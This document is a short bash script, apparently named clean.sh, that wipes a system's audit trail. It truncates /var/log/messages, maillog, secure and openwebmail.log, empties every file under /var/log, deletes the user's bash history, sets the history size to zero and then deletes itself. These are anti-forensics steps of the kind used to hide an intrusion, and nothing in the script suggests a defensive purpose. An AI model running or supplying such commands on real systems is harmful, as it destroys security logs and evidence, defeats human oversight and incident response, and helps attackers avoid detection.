#!/bin/bash
sudo cat /dev/null > /var/log/messages
sudo cat /dev/null > /var/log/openwebmail.log
sudo cat /dev/null > /var/log/maillog
sudo cat /dev/null > /var/log/secure
for logs in `find /var/log -type f`; do > $logs; done
echo "All logs cleared"

sudo rm -rf $HOME/.bash_history
export HISTSIZE=0
echo "Bash cleared"
sudo rm -rf clean.sh
